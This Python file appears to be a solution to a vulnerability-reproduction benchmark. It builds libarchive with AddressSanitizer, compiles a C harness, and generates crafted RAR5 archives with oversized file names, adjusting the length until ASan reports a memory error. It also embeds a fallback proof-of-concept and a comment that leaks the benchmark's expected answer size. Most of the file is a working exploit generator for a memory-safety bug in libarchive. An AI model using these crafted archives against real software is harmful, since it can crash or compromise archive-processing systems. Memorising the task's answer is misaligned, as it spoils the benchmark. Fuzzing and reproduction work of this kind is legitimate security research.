import os
import sys
import subprocess
import tempfile
import shutil
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            subprocess.check_call(['tar', 'xf', src_path, '-C', work_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            extracted_dirs = [d for d in os.listdir(work_dir) if os.path.isdir(os.path.join(work_dir, d))]
            if not extracted_dirs:
                return self.fallback_poc()
            src_root = os.path.join(work_dir, extracted_dirs[0])
            
            # 2. Configure and Build libarchive
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            env['CFLAGS'] = '-fsanitize=address -g -O1 -fno-omit-frame-pointer'
            env['LDFLAGS'] = '-fsanitize=address'
            
            # Minimal configuration
            conf_args = [
                './configure',
                '--disable-shared',
                '--enable-static',
                '--without-zlib',
                '--without-bz2lib',
                '--without-lzma',
                '--without-lz4',
                '--without-lzo2',
                '--without-cng',
                '--without-nettle',
                '--without-openssl',
                '--without-xml2',
                '--without-expat',
                '--without-libiconv-prefix',
                '--disable-acl'
            ]
            
            try:
                subprocess.check_call(conf_args, cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.check_call(['make', '-j8'], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                return self.fallback_poc()
            
            lib_path = os.path.join(src_root, '.libs', 'libarchive.a')
            if not os.path.exists(lib_path):
                 lib_path = os.path.join(src_root, 'libarchive', 'libarchive.a')

            if not os.path.exists(lib_path):
                return self.fallback_poc()

            # 3. Compile Harness
            harness_src = os.path.join(work_dir, 'harness.c')
            with open(harness_src, 'w') as f:
                f.write(r'''
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    if (argc < 2) return 1;
    struct archive *a = archive_read_new();
    archive_read_support_filter_all(a);
    archive_read_support_format_all(a);
    if (archive_read_open_filename(a, argv[1], 10240) != ARCHIVE_OK) {
        archive_read_free(a);
        return 0;
    }
    struct archive_entry *entry;
    while (archive_read_next_header(a, &entry) == ARCHIVE_OK) {
        // Just reading triggers the vulnerability
    }
    archive_read_free(a);
    return 0;
}
''')
            
            harness_bin = os.path.join(work_dir, 'harness')
            try:
                subprocess.check_call(['clang', '-fsanitize=address', '-g', harness_src, lib_path, '-o', harness_bin], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                return self.fallback_poc()

            # 4. Fuzz Loop
            # Ground truth is 1089 bytes. Approx name length 1060.
            # We search around this value.
            for n in range(1040, 1100):
                poc = self.make_poc(n)
                tpath = os.path.join(work_dir, 'test.rar')
                with open(tpath, 'wb') as f:
                    f.write(poc)
                
                proc = subprocess.run([harness_bin, tpath], capture_output=True)
                if proc.returncode != 0 and b"AddressSanitizer" in proc.stderr:
                    return poc
            
            # Wider search if optimized range fails
            for n in range(100, 2000, 10):
                poc = self.make_poc(n)
                tpath = os.path.join(work_dir, 'test.rar')
                with open(tpath, 'wb') as f:
                    f.write(poc)
                
                proc = subprocess.run([harness_bin, tpath], capture_output=True)
                if proc.returncode != 0 and b"AddressSanitizer" in proc.stderr:
                    return poc
            
            return self.fallback_poc()

        except Exception:
            return self.fallback_poc()
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def to_vint(self, val):
        if val == 0: return b'\x00'
        out = bytearray()
        while val >= 0x80:
            out.append((val & 0x7F) | 0x80)
            val >>= 7
        out.append(val)
        return bytes(out)

    def make_poc(self, name_len):
        sig = b"\x52\x61\x72\x21\x1A\x07\x01\x00"
        
        # Main Header (Type 1, Flags 0)
        mh_body = self.to_vint(1) + self.to_vint(0)
        mh_sz = self.to_vint(len(mh_body))
        mh_crc = struct.pack('<I', zlib.crc32(mh_body) & 0xFFFFFFFF)
        mh = mh_crc + mh_sz + mh_body
        
        # File Header (Type 2, Flags 0)
        # Fields for Flags=0: ExtraSz(0), Attr(0), Comp(0), HostOS(0), NameLen, Name
        # Note: Type(2) is part of the body for CRC calc
        fh_fields = self.to_vint(2) + self.to_vint(0) + self.to_vint(0) + \
                    self.to_vint(0) + self.to_vint(0) + self.to_vint(0) + \
                    self.to_vint(name_len) + (b'A' * name_len)
        
        fh_sz = self.to_vint(len(fh_fields))
        fh_crc = struct.pack('<I', zlib.crc32(fh_fields) & 0xFFFFFFFF)
        fh = fh_crc + fh_sz + fh_fields
        
        return sig + mh + fh

    def fallback_poc(self):
        return self.make_poc(1060)